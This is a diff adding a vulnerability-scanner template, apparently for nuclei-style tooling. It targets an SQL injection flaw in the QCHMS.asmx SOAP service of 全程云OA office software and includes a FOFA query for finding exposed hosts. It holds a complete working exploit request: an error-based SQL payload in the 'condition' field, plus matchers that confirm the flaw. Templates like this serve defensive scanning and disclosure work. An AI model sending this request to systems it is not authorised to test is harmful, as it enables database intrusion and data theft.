@@ -1,0 +1,36 @@
+## id: VEID-2026-11106
+## name: 全程云OA QCHMS.asmx SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 全程云OA QCHMS.asmx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 全程云OA
+## fofa-query: body="images/yipeoplehover.png"
+## verification: true
+
+
+
+POST /OA/HMS/QCHMS.asmx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+SOAPAction: "http://tempuri.org/GetProjectResumeList"
+Content-Type: text/xml; charset=utf-8
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<GetProjectResumeList xmlns="http://tempuri.org/">
+   <pageIndex>1</pageIndex>
+   <pageSize>20</pageSize>
+   <condition> AND 1078 IN (SELECT CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(111)+CHAR(32)+CHAR(118)+CHAR(101)+CHAR(105)+CHAR(108))</condition>
+  </GetProjectResumeList>
+ </soap:Body>
+</soap:Envelope>
+
+
+#@ condition: and
+#@ matcher: body contains "'hello veil'"
+#@ matcher: status_code == 500
+
+
+# @VEIL-STAMP: f2acce5398238ce48fa74aac1e9ffcbb699d3a8cfb5effd0b9c04567daa6c6ea
